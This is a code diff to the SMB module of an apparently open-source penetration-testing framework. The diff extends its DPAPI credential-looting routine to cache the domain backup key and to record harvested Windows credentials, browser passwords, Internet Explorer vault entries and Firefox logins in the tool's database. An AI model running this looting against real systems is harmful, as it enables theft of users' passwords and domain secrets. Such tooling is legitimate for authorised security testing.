@@ -1180,6 +1180,7 @@ class smb(connection):
         if self.args.pvk is not None:
             try:
                 self.pvkbytes = open(self.args.pvk, 'rb').read()
+                self.logger.success("Loading domain backupkey from {}".format(self.args.pvk))
             except Exception as e:
                 logging.error(str(e))
 
@@ -1192,30 +1193,40 @@ class smb(connection):
 
         if self.pvkbytes is None and self.no_da == None and self.args.local_auth == False:
             try:
-                dc_target = Target.create(
-                    domain      = self.domain,
-                    username    = self.username,
-                    password    = self.password,
-                    target      = self.domain,
-                    lmhash      = self.lmhash,
-                    nthash      = self.nthash,
-                    do_kerberos = self.kerberos,
-                    aesKey      = self.aesKey,
-                    no_pass     = True,
-                    use_kcache  = self.use_kcache,
-                )
-                dc_conn = DPLootSMBConnection(dc_target) 
-                dc_conn.connect() # Connect to DC
-                if dc_conn.is_admin():
-                    self.logger.success("User is Domain Administrator, exporting domain backupkey...")
-                    backupkey_triage = BackupkeyTriage(target=dc_target, conn=dc_conn)
-                    backupkey = backupkey_triage.triage_backupkey()
-                    self.pvkbytes = backupkey.backupkey_v2
-                else:
-                    self.no_da = False
-            except Exception as e:
-                self.logger.debug("Could not get domain backupkey: {}".format(e))
-                pass
+                results = self.db.get_domain_backupkey(self.domain)
+            except:
+                self.logger.error("Your version of CMEDB is not up to date, run cmedb and create a new workspace: 'workspace create dpapi' then re-run the dpapi option")
+                return False
+            if len(results) > 0:
+                self.logger.success("Loading domain backupkey from cmedb...")
+                self.pvkbytes = results[0][2]
+            else: 
+                try:
+                    dc_target = Target.create(
+                        domain      = self.domain,
+                        username    = self.username,
+                        password    = self.password,
+                        target      = self.domain,
+                        lmhash      = self.lmhash,
+                        nthash      = self.nthash,
+                        do_kerberos = self.kerberos,
+                        aesKey      = self.aesKey,
+                        no_pass     = True,
+                        use_kcache  = self.use_kcache,
+                    )
+                    dc_conn = DPLootSMBConnection(dc_target) 
+                    dc_conn.connect() # Connect to DC
+                    if dc_conn.is_admin():
+                        self.logger.success("User is Domain Administrator, exporting domain backupkey...")
+                        backupkey_triage = BackupkeyTriage(target=dc_target, conn=dc_conn)
+                        backupkey = backupkey_triage.triage_backupkey()
+                        self.pvkbytes = backupkey.backupkey_v2
+                        self.db.add_domain_backupkey(self.domain, self.pvkbytes)
+                    else:
+                        self.no_da = False
+                except Exception as e:
+                    self.logger.debug("Could not get domain backupkey: {}".format(e))
+                    pass
 
         target = Target.create(
             domain      = self.domain,
@@ -1268,9 +1279,11 @@ class smb(connection):
             self.logger.debug("Error while looting credentials: {}".format(e))
         for credential in credentials:
             self.logger.highlight("[%s][CREDENTIAL] %s - %s:%s" % (credential.winuser, credential.target, credential.username, credential.password))
+            self.db.add_dpapi_secrets(target.address, 'CREDENTIAL', credential.winuser, credential.username, credential.password, credential.target)
         for credential in system_credentials:
             self.logger.highlight("[SYSTEM][CREDENTIAL] %s - %s:%s" % (credential.target, credential.username, credential.password))
-        
+            self.db.add_dpapi_secrets(target.address, 'CREDENTIAL', 'SYSTEM', credential.username, credential.password, credential.target)
+
         try:
             # Collect Chrome Based Browser stored secrets
             dump_cookies = True if self.args.dpapi == "cookies" else False
@@ -1280,6 +1293,8 @@ class smb(connection):
             self.logger.debug("Error while looting browsers: {}".format(e))
         for credential in browser_credentials:
             self.logger.highlight("[%s][%s] %s %s:%s" % (credential.winuser, credential.browser.upper(), credential.url+' -' if credential.url!= '' else '-', credential.username, credential.password))
+            self.db.add_dpapi_secrets(target.address, credential.browser.upper(), credential.winuser, credential.username, credential.password, credential.url)
+        
         if dump_cookies:
             self.logger.info("Start Dumping Cookies")
             for cookie in cookies:
@@ -1295,7 +1310,7 @@ class smb(connection):
         for vault in vaults:
             if vault.type == 'Internet Explorer':
                 self.logger.highlight("[%s][IEX] %s - %s:%s" % (vault.winuser, vault.resource+' -' if vault.resource!= '' else '-', vault.username, vault.password))
-        
+                self.db.add_dpapi_secrets(target.address, 'IEX', vault.winuser, vault.username, vault.password, vault.resource)
 
         try:
             # Collect Firefox stored secrets
@@ -1305,7 +1320,7 @@ class smb(connection):
             self.logger.debug("Error while looting firefox: {}".format(e))
         for credential in firefox_credentials:
             self.logger.highlight("[%s][FIREFOX] %s %s:%s" % (credential.winuser, credential.url+' -' if credential.url!= '' else '-', credential.username, credential.password))
-        
+            self.db.add_dpapi_secrets(target.address, 'FIREFOX', credential.winuser, credential.username, credential.password, credential.url)
 
     @requires_admin
     def lsa(self):
